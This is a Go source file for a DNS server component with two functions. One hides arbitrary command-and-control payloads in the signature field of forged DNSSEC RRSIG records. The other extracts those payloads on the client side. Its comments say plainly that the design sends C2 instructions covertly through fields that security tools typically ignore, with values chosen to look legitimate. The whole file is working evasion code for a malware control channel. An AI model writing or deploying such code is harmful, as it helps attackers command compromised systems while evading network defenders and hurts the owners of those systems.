package dnsserver

import (
	"encoding/base64"
	"fmt"
	"time"

	"github.com/miekg/dns"
)

// InjectStegoRRSIG injects an arbitrary payload into a fake DNSSEC RRSIG record.
// This allows the server to send C2 instructions back to the client hidden
// within cryptographic signature fields that security tools typically ignore.
func InjectStegoRRSIG(msg *dns.Msg, domain string, payload []byte) error {
	// Base64 encode the payload to match the aesthetic of an RRSIG signature format
	encodedPayload := base64.StdEncoding.EncodeToString(payload)

	// Create a fake RRSIG
	rrsig := &dns.RRSIG{
		Hdr: dns.RR_Header{
			Name:   dns.Fqdn(domain),
			Rrtype: dns.TypeRRSIG,
			Class:  dns.ClassINET,
			Ttl:    300,
		},
		TypeCovered: dns.TypeA,
		Algorithm:   dns.ECDSAP256SHA256, // Elliptic Curve (looks very standard/modern)
		Labels:      uint8(dns.CountLabel(domain)),
		OrigTtl:     300,
		Expiration:  uint32(time.Now().Add(24 * time.Hour).Unix()),
		Inception:   uint32(time.Now().Add(-1 * time.Hour).Unix()),
		KeyTag:      12345,
		SignerName:  dns.Fqdn(domain),
		Signature:   encodedPayload,
	}

	// Append to the Answer section (or Extra section if preferred)
	msg.Answer = append(msg.Answer, rrsig)

	// Set the DO (DNSSEC OK) bit in the response to validate the record's presence
	opt := msg.IsEdns0()
	if opt == nil {
		opt = new(dns.OPT)
		opt.Hdr.Name = "."
		opt.Hdr.Rrtype = dns.TypeOPT
		opt.SetUDPSize(4096)
		msg.Extra = append(msg.Extra, opt)
	}
	opt.SetDo()

	return nil
}

// ExtractStegoRRSIG extracts the hidden payload from an RRSIG record's signature.
// This is used by the client to receive the C2 command.
func ExtractStegoRRSIG(msg *dns.Msg) ([]byte, error) {
	// Search Answer and Extra sections
	records := append(msg.Answer, msg.Extra...)

	for _, rr := range records {
		if rrsig, ok := rr.(*dns.RRSIG); ok {
			// Decode the signature field back into our raw C2 payload
			decoded, err := base64.StdEncoding.DecodeString(rrsig.Signature)
			if err != nil {
				return nil, fmt.Errorf("failed to decode RRSIG signature: %w", err)
			}
			return decoded, nil
		}
	}
	return nil, fmt.Errorf("no RRSIG records found in response")
}
